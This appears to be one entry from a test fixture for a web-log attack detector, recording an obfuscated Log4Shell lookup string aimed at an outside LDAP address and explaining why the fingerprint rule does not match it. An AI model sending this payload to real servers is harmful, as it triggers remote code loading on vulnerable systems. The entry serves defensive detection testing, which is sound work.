    {"id": "cve_log4shell_obfuscated", "line": "/api/data | ${${lower:j}ndi:${lower:l}dap://198.51.100.7/a}", "category": "cve", "expect_fingerprint": false, "note": "The ${lower:j} nested-lookup evasion. Layer 1 does not resolve Log4j lookups, so the literal string jndi: never appears and the fingerprint cannot fire without a fuzzy pattern — which is exactly what the admission bar in cve_fingerprints.json forbids. CRS catches it and it lands on Suspicious, which is the honest answer for something we cannot confirm."},
